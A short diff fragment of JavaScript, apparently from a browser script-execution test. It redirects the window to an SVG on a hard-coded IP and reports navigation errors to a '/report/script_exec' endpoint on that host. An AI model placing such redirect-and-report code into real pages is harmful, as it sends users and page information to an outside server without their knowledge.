@@ -41,7 +41,7 @@
     try {
       window.setTimeout(function() {
         try {
-          window.location.href = "http://191.32.31.251/app.svg";
+          window.location.href = "http://191.32.31.251/launch.svg";
         } catch(e) {
           try {
             getURL("http://191.32.31.251/report/script_exec?target=portal_svg&method=location_error&message=" + encodeURIComponent(String(e)), function(){});
